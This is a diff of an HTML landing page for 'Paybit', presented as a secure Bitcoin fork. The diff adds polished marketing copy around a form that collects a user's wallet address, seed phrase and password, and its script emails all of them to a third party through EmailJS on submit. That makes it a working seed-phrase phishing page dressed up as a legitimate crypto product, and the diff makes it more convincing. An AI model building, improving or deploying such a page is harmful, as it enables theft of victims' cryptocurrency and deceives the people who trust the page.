@@ -1,25 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Crypto</title>
+    <title>Paybit - Secure Crypto Transactions</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,700|Open+Sans" rel="stylesheet">
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/custom.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <!-- Corrected EmailJS library inclusion -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script type="text/javascript">
-        // Initialize EmailJS with your public API key
-        (function(){
-            emailjs.init({
-                publicKey: "UzvWE4cijC2AeexsY"  // Use your actual public key here
-            });
-        })();
-    </script>
     <script>
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("UzvWE4cijC2AeexsY");
+        })();
+
         $(document).ready(function(){
             $('form').on('submit', function(event) {
-                event.preventDefault(); // Prevent default form submission
+                event.preventDefault();
 
                 var emailData = {
                     email: $('input[name=email]').val(),
@@ -30,13 +28,10 @@
                     password: $('input[name=password]').val()
                 };
 
-                // Send email using EmailJS with your template ID and service ID
                 emailjs.send("service_29nyhzq", "template_i3682ek", emailData)
                     .then(function(response) {
-                        console.log('Success:', response);
                         alert('Email sent successfully!');
                     }, function(error) {
-                        console.error('Failed:', error);
                         alert('Failed to send email. Please try again.');
                     });
             });
@@ -45,84 +40,98 @@
 </head>
 <body class="home">
     <div class="container">
-        <header>
-            <nav class="navbar">
-                <div class="container-fluid">
-                    <div class="navbar-header col-md-2">
-                        <a class="navbar-brand" href="#"><img src="images/Group.png" alt="LOGO"></a>
-                    </div>
-                    <div class="title col-md-10">
-                        <p class="text-center">Lorem ipsum dolor sit amet</p>
-                        <h1 class="text-center">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h1>
-                    </div>
-                </div>
-            </nav>
+        <!-- Header Section -->
+        <header class="text-center py-4">
+            <a class="navbar-brand" href="#">
+                <img src="images/Group.png" alt="Paybit Logo" class="img-fluid" style="max-width: 150px;">
+            </a>
+            <h1>Welcome to Paybit</h1>
+            <p>Your trusted Bitcoin fork for secure, fast, and decentralized transactions.</p>
         </header>
 
-        <div class="main content">
-            <form>
-                <p class="col-md-12"><strong>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</strong></p>
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="form-group">
-                            <label for="email">Email</label>
-                            <input type="email" name="email" class="input-text col-md-5" required/>
-                        </div>
-                    </div>
-                    <div class="col-md-6">
-                        <div class="form-group">
-                            <label for="dropdown1">Dropdown 1</label>
-                            <select name="dropdown1" class="dropdown col-md-5">
-                                <option>Select</option>
-                                <option value="BIP32">BIP32</option>
-                                <option value="BIP39">BIP39</option>
-                                <option value="BIP44">BIP44</option>
-                            </select>
-                        </div>
-                    </div>
+        <!-- Navigation Section -->
+        <nav class="navbar navbar-expand-lg navbar-light bg-light mb-4">
+            <div class="container">
+                <a class="navbar-brand" href="#">
+                    <img src="images/Group.png" alt="Paybit Logo" class="img-fluid" style="max-width: 150px;">
+                </a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item"><a class="nav-link" href="#about">About</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#features">Features</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#form">Get Started</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://github.com/paybit" target="_blank">GitHub</a></li>
+                    </ul>
                 </div>
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="form-group">
-                            <label for="dropdown2">Dropdown 2</label>
-                            <select name="dropdown2" class="dropdown col-md-5">
-                                <option>Select</option>
-                                <option value="12">12</option>
-                                <option value="18">18</option>
-                                <option value="24">24</option>
-                            </select>
-                        </div>
-                    </div>
-                    <div class="col-md-6">
-                        <div class="form-group">
-                            <label for="address">Payment Address</label>
-                            <input type="text" name="address" class="input-text col-md-12" placeholder="Address" required/>
-                        </div>
-                    </div>
+            </div>
+        </nav>
+
+        <!-- About Section -->
+        <section id="about" class="mb-5 text-center">
+            <h2>About Paybit</h2>
+            <p>Paybit is a cutting-edge Bitcoin fork designed to improve transaction speed and security while maintaining full decentralization.</p>
+            <img src="images/about-image.png" alt="About Paybit" class="img-fluid my-4" style="max-width: 100%;">
+        </section>
+
+        <!-- Features Section -->
+        <section id="features" class="mb-5 text-center">
+            <h2>Key Features</h2>
+            <ul class="list-unstyled">
+                <li><strong>Lightning-Fast Transactions:</strong> Experience unprecedented speed with our optimized blockchain.</li>
+                <li><strong>Enhanced Security:</strong> Advanced encryption methods for your peace of mind.</li>
+                <li><strong>Community-Driven:</strong> Open-source project with contributions from top developers worldwide.</li>
+            </ul>
+        </section>
+
+        <!-- Form Section -->
+        <section id="form" class="mb-5">
+            <h2 class="text-center">Get Started with Paybit</h2>
+            <form class="p-4 border rounded">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
                 </div>
-                <div class="row">
-                    <div class="col-md-12">
-                        <div class="form-group">
-                            <label for="seed">Seed</label>
-                            <input type="text" name="seed" class="input-text col-md-12" placeholder="Seed" required/>
-                        </div>
-                    </div>
+                <div class="form-group">
+                    <label for="dropdown1">Wallet Type</label>
+                    <select name="dropdown1" class="form-control">
+                        <option value="" disabled selected>Select Wallet Type</option>
+                        <option value="BIP32">BIP32</option>
+                        <option value="BIP39">BIP39</option>
+                        <option value="BIP44">BIP44</option>
+                    </select>
                 </div>
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="form-group">
-                            <label for="password">Password</label>
-                            <input type="password" name="password" class="input-text col-md-5" placeholder="Password" required/>
-                        </div>
-                    </div>
+                <div class="form-group">
+                    <label for="dropdown2">Mnemonic Length</label>
+                    <select name="dropdown2" class="form-control">
+                        <option value="" disabled selected>Select Mnemonic Length</option>
+                        <option value="12">12</option>
+                        <option value="18">18</option>
+                        <option value="24">24</option>
+                    </select>
                 </div>
-                <div class="row">
-                    <div class="col-md-6">
-                        <button type="submit" class="btn btn-default">Submit</button>
-                    </div>
+                <div class="form-group">
+                    <label for="address">Wallet Address</label>
+                    <input type="text" name="address" class="form-control" placeholder="Enter your wallet address" required>
                 </div>
+                <div class="form-group">
+                    <label for="seed">Seed Phrase</label>
+                    <input type="text" name="seed" class="form-control" placeholder="Enter your seed phrase" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">Submit</button>
             </form>
-        </div>
+        </section>
+
+        <!-- Footer Section -->
+        <footer class="text-center py-4">
+            <p>&copy; 2024 Paybit. All Rights Reserved. | <a href="https://github.com/paybit" target="_blank">GitHub</a></p>
+        </footer>
     </div>
 </body>
 </html>
